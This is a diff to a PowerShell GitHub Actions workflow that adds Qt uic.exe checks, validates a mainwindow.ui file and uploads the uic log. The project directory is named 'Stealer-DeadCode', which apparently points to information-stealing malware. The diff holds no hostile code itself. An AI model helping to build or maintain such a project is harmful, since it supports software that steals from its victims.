@@ -73,6 +73,15 @@ jobs:
           Write-Host "qmake.exe not found in C:/Qt/5.15.2"
           exit 1
         }
+        Write-Host "Checking for uic.exe in C:/Qt/5.15.2:"
+        $uicPath = (Get-ChildItem -Path C:/Qt/5.15.2 -Filter uic.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
+        if ($uicPath) {
+          Write-Host "uic.exe found at $uicPath!"
+        } else {
+          Write-Host "Error: uic.exe not found in C:/Qt/5.15.2"
+          dir C:/Qt/5.15.2 -Recurse
+          exit 1
+        }
       shell: powershell
 
     - name: Cache vcpkg
@@ -242,6 +251,28 @@ jobs:
         Write-Host "Project structure verified"
       shell: powershell
 
+    - name: Verify mainwindow.ui
+      run: |
+        cd Stealer-DeadCode
+        Write-Host "Checking mainwindow.ui for validity..."
+        $uicPath = (Get-ChildItem -Path C:/Qt/5.15.2 -Filter uic.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
+        if (-not $uicPath) {
+          Write-Host "Error: uic.exe not found in C:/Qt/5.15.2"
+          exit 1
+        }
+        & $uicPath ui/mainwindow.ui -o test_ui_mainwindow.h 2>&1 | Tee-Object -FilePath "uic_output.log"
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: mainwindow.ui is invalid. Check the logs for details."
+          if (Test-Path uic_output.log) {
+            Write-Host "Contents of uic_output.log:"
+            Get-Content uic_output.log
+          }
+          exit 1
+        }
+        Remove-Item -Path test_ui_mainwindow.h -Force -ErrorAction SilentlyContinue
+        Write-Host "mainwindow.ui is valid"
+      shell: powershell
+
     - name: Configure and build
       run: |
         cd Stealer-DeadCode
@@ -335,6 +366,7 @@ jobs:
         path: |
           Stealer-DeadCode/qmake_output.log
           Stealer-DeadCode/make_output.log
+          Stealer-DeadCode/uic_output.log
         if-no-files-found: warn
 
     - name: Upload artifact
